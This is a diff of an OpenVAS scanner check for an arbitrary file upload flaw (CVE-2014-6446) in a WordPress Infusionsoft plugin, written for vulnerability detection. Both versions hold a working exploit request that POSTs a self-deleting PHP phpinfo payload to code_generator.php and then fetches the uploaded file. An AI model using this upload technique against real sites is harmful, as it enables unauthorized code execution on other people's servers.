@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_wp_infusionsoft_gravity_forms_file_upload_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
+# $Id: gb_wp_infusionsoft_gravity_forms_file_upload_vuln.nasl 13994 2019-03-05 12:23:37Z cfischer $
 #
 # Wordpress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability
 #
@@ -29,11 +29,11 @@ CPE = "cpe:/a:wordpress:wordpress";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804769");
-  script_version("$Revision: 11867 $");
+  script_version("$Revision: 13994 $");
   script_cve_id("CVE-2014-6446");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
   script_tag(name:"creation_date", value:"2014-09-29 17:24:16 +0530 (Mon, 29 Sep 2014)");
 
   script_name("Wordpress Infusionsoft Gravity Forms Add-on Arbitrary File Upload Vulnerability");
@@ -66,60 +66,61 @@ if(description)
   script_dependencies("secpod_wordpress_detect_900182.nasl");
   script_mandatory_keys("wordpress/installed");
   script_require_ports("Services/www", 80);
+
   exit(0);
 }
-
 
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if(!http_port = get_app_port(cpe:CPE)){
+if(!http_port = get_app_port(cpe:CPE))
   exit(0);
-}
 
-if(!dir = get_app_location(cpe:CPE, port:http_port)){
+if(!dir = get_app_location(cpe:CPE, port:http_port))
   exit(0);
-}
+
+if(dir == "/")
+  dir = "";
+
+host = http_host_name(port:http_port);
 
 url = dir + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/code_generator.php';
-vtstring = get_vt_string();
-
-wpReq = http_get(item: url,  port:http_port);
+wpReq = http_get(item:url, port:http_port);
 wpRes = http_keepalive_send_recv(port:http_port, data:wpReq, bodyonly:TRUE);
 
 if(">Code Generator<" >< wpRes &&
    "tool will generate a file based on the information you put" >< wpRes)
 {
-  fileName = vtstring + '_' + rand() + '.php';
+
+  vtstrings = get_vt_strings();
+  fileName = vtstrings["lowercase_rand"] + ".php";
 
   postData = string('fileNamePattern=out%2F', fileName,
                     '&fileTemplate=%3C%3Fphp+phpinfo%28%29%3B+unlink%28+%22',
                     fileName, '%22+%29%3B+%3F%3E');
 
   sndReq = string("POST ", url, " HTTP/1.1\r\n",
-                  "Host: ", get_host_name(), "\r\n",
+                  "Host: ", host, "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(postData), "\r\n\r\n",
                   postData, "\r\n");
-
   rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);
 
   if('Generating Code' >< rcvRes && 'Creating File:' >< rcvRes)
   {
-    ## Uploaded file URL
-    url = dir + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/out/' + fileName;
 
+    url = dir + '/wp-content/plugins/infusionsoft/Infusionsoft/utilities/out/' + fileName;
     if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
        pattern:">phpinfo\(\)<", extra_check:">PHP Documentation<"))
     {
-      if(http_vuln_check(port:http_port, url:url,
-         check_header:FALSE, pattern:"^HTTP/1\.[01] 404"))
-      {
-        security_message(http_port);
-        exit(0);
-      }
+      report = report_vuln_url(port:http_port, url:url);
+      security_message(port:http_port, data:report);
+      exit(0);
     }
   }
+  exit(99);
 }
+
+exit(0);
